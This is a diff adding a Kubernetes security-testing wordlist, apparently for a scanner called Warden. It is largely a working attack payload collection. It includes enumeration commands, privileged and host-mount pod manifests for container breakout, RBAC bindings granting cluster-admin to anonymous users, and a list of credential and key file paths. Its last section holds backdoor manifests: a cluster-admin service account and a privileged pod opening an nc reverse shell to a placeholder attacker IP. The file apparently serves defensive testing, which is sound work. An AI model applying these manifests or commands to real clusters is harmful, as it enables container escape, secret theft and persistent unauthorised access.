@@ -1,0 +1,533 @@
+# Kubernetes Security Testing Wordlist
+# For Warden v0.8.0 Enterprise Edition
+# Contains ~200 payloads for K8s security testing
+
+# ============================================================================
+# API ENDPOINTS - K8s API Server Paths
+# ============================================================================
+/api/v1
+/api/v1/namespaces
+/api/v1/namespaces/default
+/api/v1/namespaces/default/pods
+/api/v1/namespaces/default/secrets
+/api/v1/namespaces/default/configmaps
+/api/v1/namespaces/default/services
+/api/v1/namespaces/default/deployments
+/api/v1/namespaces/kube-system
+/api/v1/namespaces/kube-system/secrets
+/api/v1/namespaces/kube-system/pods
+/api/v1/namespaces/kube-system/configmaps
+/api/v1/nodes
+/api/v1/pods
+/api/v1/services
+/api/v1/configmaps
+/api/v1/secrets
+/api/v1/persistentvolumes
+/api/v1/persistentvolumeclaims
+/api/v1/serviceaccounts
+/api/v1/resourcequotas
+/api/v1/limitranges
+/apis
+/apis/apps/v1
+/apis/apps/v1/deployments
+/apis/apps/v1/statefulsets
+/apis/apps/v1/daemonsets
+/apis/apps/v1/replicasets
+/apis/batch/v1
+/apis/batch/v1/jobs
+/apis/batch/v1/cronjobs
+/apis/rbac.authorization.k8s.io/v1
+/apis/rbac.authorization.k8s.io/v1/clusterroles
+/apis/rbac.authorization.k8s.io/v1/clusterrolebindings
+/apis/rbac.authorization.k8s.io/v1/roles
+/apis/rbac.authorization.k8s.io/v1/rolebindings
+/apis/networking.k8s.io/v1
+/apis/networking.k8s.io/v1/networkpolicies
+/apis/networking.k8s.io/v1/ingresses
+/apis/storage.k8s.io/v1
+/apis/storage.k8s.io/v1/storageclasses
+/apis/authentication.k8s.io/v1
+/apis/authorization.k8s.io/v1
+/apis/certificates.k8s.io/v1
+/healthz
+/healthz/log
+/healthz/ready
+/healthz/live
+/metrics
+/version
+/openapi/v2
+/swagger.json
+
+# ============================================================================
+# KUBECTL COMMANDS - For testing and enumeration
+# ============================================================================
+kubectl get pods
+kubectl get pods --all-namespaces
+kubectl get pods -A
+kubectl get secrets
+kubectl get secrets --all-namespaces
+kubectl get secrets -A
+kubectl get configmaps
+kubectl get services
+kubectl get deployments
+kubectl get statefulsets
+kubectl get daemonsets
+kubectl get nodes
+kubectl get namespaces
+kubectl get serviceaccounts
+kubectl get clusterroles
+kubectl get clusterrolebindings
+kubectl get roles --all-namespaces
+kubectl get rolebindings --all-namespaces
+kubectl get networkpolicies --all-namespaces
+kubectl get events --all-namespaces
+kubectl describe pod <pod-name>
+kubectl describe secret <secret-name>
+kubectl logs <pod-name>
+kubectl logs <pod-name> -c <container-name>
+kubectl exec -it <pod-name> -- sh
+kubectl exec -it <pod-name> -- bash
+kubectl auth can-i list pods
+kubectl auth can-i create secrets
+kubectl auth can-i delete nodes
+kubectl auth can-i --list
+kubectl get rolebindings -o json
+kubectl get clusterrolebindings -o json
+kubectl get secrets -o json
+kubectl proxy
+kubectl port-forward <pod-name> 8080:80
+kubectl cp <pod-name>:/etc/passwd ./passwd
+kubectl run -i --tty busybox --image=busybox --restart=Never -- sh
+kubectl run my-shell --rm -it --image=busybox -- sh
+kubectl apply -f malicious.yaml
+kubectl create -f malicious.yaml
+kubectl patch deployment <name> --type='json' -p='[...]'
+kubectl top pods
+kubectl top nodes
+kubectl cordon <node-name>
+kubectl uncordon <node-name>
+kubectl drain <node-name>
+kubectl taint nodes <node-name> key=value:NoSchedule
+kubectl api-resources
+kubectl api-versions
+kubectl cluster-info
+
+# ============================================================================
+# YAML MANIFEST TESTS - Pod Security
+# ============================================================================
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privileged-pod
+spec:
+  containers:
+  - name: container
+    image: busybox
+    securityContext:
+      privileged: true
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: hostpid-pod
+spec:
+  hostPID: true
+  containers:
+  - name: container
+    image: busybox
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: hostnetwork-pod
+spec:
+  hostNetwork: true
+  containers:
+  - name: container
+    image: busybox
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: hostipc-pod
+spec:
+  hostIPC: true
+  containers:
+  - name: container
+    image: busybox
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: root-pod
+spec:
+  containers:
+  - name: container
+    image: busybox
+    securityContext:
+      runAsUser: 0
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: hostpath-mount-pod
+spec:
+  containers:
+  - name: container
+    image: busybox
+    volumeMounts:
+    - mountPath: /host
+      name: host-root
+  volumes:
+  - name: host-root
+    hostPath:
+      path: /
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: docker-sock-pod
+spec:
+  containers:
+  - name: container
+    image: busybox
+    volumeMounts:
+    - mountPath: /docker.sock
+      name: docker-sock
+  volumes:
+  - name: docker-sock
+    hostPath:
+      path: /var/run/docker.sock
+
+# ============================================================================
+# YAML MANIFEST TESTS - RBAC Misconfigurations
+# ============================================================================
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: wildcard-resources
+rules:
+- apiGroups: ["*"]
+  resources: ["*"]
+  verbs: ["*"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: pod-exec
+rules:
+- apiGroups: [""]
+  resources: ["pods/exec"]
+  verbs: ["create"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: anonymous-admin
+subjects:
+- kind: User
+  name: system:anonymous
+  apiGroup: rbac.authorization.k8s.io
+roleRef:
+  kind: ClusterRole
+  name: cluster-admin
+  apiGroup: rbac.authorization.k8s.io
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: authenticated-admin
+subjects:
+- kind: Group
+  name: system:authenticated
+  apiGroup: rbac.authorization.k8s.io
+roleRef:
+  kind: ClusterRole
+  name: cluster-admin
+  apiGroup: rbac.authorization.k8s.io
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: default-sa-admin
+  namespace: default
+subjects:
+- kind: ServiceAccount
+  name: default
+  namespace: default
+roleRef:
+  kind: ClusterRole
+  name: cluster-admin
+  apiGroup: rbac.authorization.k8s.io
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: secrets-access
+rules:
+- apiGroups: [""]
+  resources: ["secrets"]
+  verbs: ["get", "list", "watch"]
+
+# ============================================================================
+# YAML MANIFEST TESTS - Secrets Exposure
+# ============================================================================
+apiVersion: v1
+kind: Secret
+metadata:
+  name: hardcoded-secret
+type: Opaque
+data:
+  password: cGFzc3dvcmQxMjM=
+  api-key: YXBpX2tleV9leGFtcGxl
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: secrets-in-configmap
+data:
+  database-password: "password123"
+  api-key: "sk-1234567890"
+  secret-token: "bearer_token_here"
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: secret-env-pod
+spec:
+  containers:
+  - name: container
+    image: busybox
+    env:
+    - name: PASSWORD
+      valueFrom:
+        secretKeyRef:
+          name: my-secret
+          key: password
+    - name: API_KEY
+      value: "hardcoded_api_key_here"
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: envfrom-secrets
+spec:
+  containers:
+  - name: container
+    image: busybox
+    envFrom:
+    - secretRef:
+        name: all-secrets
+
+# ============================================================================
+# YAML MANIFEST TESTS - Dangerous Capabilities
+# ============================================================================
+apiVersion: v1
+kind: Pod
+metadata:
+  name: sys-admin-cap
+spec:
+  containers:
+  - name: container
+    image: busybox
+    securityContext:
+      capabilities:
+        add:
+        - SYS_ADMIN
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: all-caps
+spec:
+  containers:
+  - name: container
+    image: busybox
+    securityContext:
+      capabilities:
+        add:
+        - SYS_ADMIN
+        - SYS_MODULE
+        - SYS_PTRACE
+        - SYS_RAWIO
+        - NET_ADMIN
+        - NET_RAW
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privilege-escalation
+spec:
+  containers:
+  - name: container
+    image: busybox
+    securityContext:
+      allowPrivilegeEscalation: true
+
+# ============================================================================
+# YAML MANIFEST TESTS - Missing Resource Limits
+# ============================================================================
+apiVersion: v1
+kind: Pod
+metadata:
+  name: no-limits-pod
+spec:
+  containers:
+  - name: container
+    image: busybox
+    # No resources section at all
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: partial-limits-pod
+spec:
+  containers:
+  - name: container
+    image: busybox
+    resources:
+      requests:
+        memory: "64Mi"
+        cpu: "250m"
+      # Missing limits
+
+# ============================================================================
+# ATTACK PATTERNS - Container Breakout
+# ============================================================================
+# hostpath volume mount to /
+mountPath: /
+hostPath:
+  path: /
+# Access to docker socket
+hostPath:
+  path: /var/run/docker.sock
+# Access to kubelet
+hostPath:
+  path: /var/lib/kubelet
+# Access to host root filesystem
+mountPath: /host/root
+hostPath:
+  path: /root
+# Privileged mode
+securityContext:
+  privileged: true
+# PID namespace sharing
+hostPID: true
+# IPC namespace sharing
+hostIPC: true
+# Network namespace sharing
+hostNetwork: true
+
+# ============================================================================
+# ATTACK PATTERNS - RBAC Privilege Escalation
+# ============================================================================
+# Create deployment with privileged pod
+resources: ["deployments"]
+verbs: ["create", "get", "list"]
+# Exec into pods
+resources: ["pods/exec"]
+verbs: ["create"]
+# Port forward from pods
+resources: ["pods/portforward"]
+verbs: ["create"]
+# Access to secrets
+resources: ["secrets"]
+verbs: ["get", "list", "watch", "create"]
+# Modify nodes
+resources: ["nodes"]
+verbs: ["get", "list", "create", "update", "patch", "delete"]
+# Impersonate users
+resources: ["users"]
+verbs: ["impersonate"]
+# Bind cluster-admin
+resourceNames: ["cluster-admin"]
+verbs: ["bind", "escalate"]
+
+# ============================================================================
+# HELM CHART TESTS
+# ============================================================================
+helm list --all-namespaces
+helm get values <release-name>
+helm get manifest <release-name>
+helm history <release-name>
+helm rollback <release-name>
+helm template <release-name> <chart>
+helm lint <chart>
+helm install test-release <chart> --dry-run
+helm status <release-name>
+helm pull <chart> --untar
+helm show values <chart>
+
+# ============================================================================
+# KUSTOMIZE TESTS
+# ============================================================================
+kustomize build .
+kustomize edit add configmap config
+kustomize edit set image nginx=nginx:1.14.2
+kustomize edit add namespace my-namespace
+kustomize build --enable_alpha_plugins
+
+# ============================================================================
+# SENSITIVE FILE PATHS IN K8S CONTEXT
+#====
+/.dockerenv
+/proc/1/cgroup
+/proc/self/cgroup
+/proc/self/environ
+/proc/self/mounts
+/proc/self/status
+/proc/self/cmdline
+/etc/hosts
+/etc/resolv.conf
+/etc/passwd
+/etc/shadow
+/run/secrets/kubernetes.io/serviceaccount/token
+/run/secrets/kubernetes.io/serviceaccount/ca.crt
+/run/secrets/kubernetes.io/serviceaccount/namespace
+/var/run/secrets/kubernetes.io/serviceaccount/token
+/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+/home/.bash_history
+/root/.ssh/id_rsa
+/root/.kube/config
+/.kube/config
+
+# ============================================================================
+# SERVICE ACCOUNT TOKEN ENDPOINTS
+#====
+https://kubernetes.default.svc/api/v1/namespaces/default/serviceaccounts/default/token
+https://kubernetes.default.svc/api/v1/pods
+https://kubernetes.default.svc/api/v1/secrets
+https://kubernetes.default.svc/apis/rbac.authorization.k8s.io/v1/roles
+
+# ============================================================================
+# IMPLANT/BACKDOOR MANIFESTS
+#====
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: backdoor-sa
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: backdoor-crb
+subjects:
+- kind: ServiceAccount
+  name: backdoor-sa
+  namespace: default
+roleRef:
+  kind: ClusterRole
+  name: cluster-admin
+  apiGroup: rbac.authorization.k8s.io
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: reverse-shell-pod
+spec:
+  containers:
+  - name: shell
+    image: busybox
+    command: ["/bin/sh", "-c", "nc <attacker-ip> 4444 -e /bin/sh"]
+    securityContext:
+      privileged: true
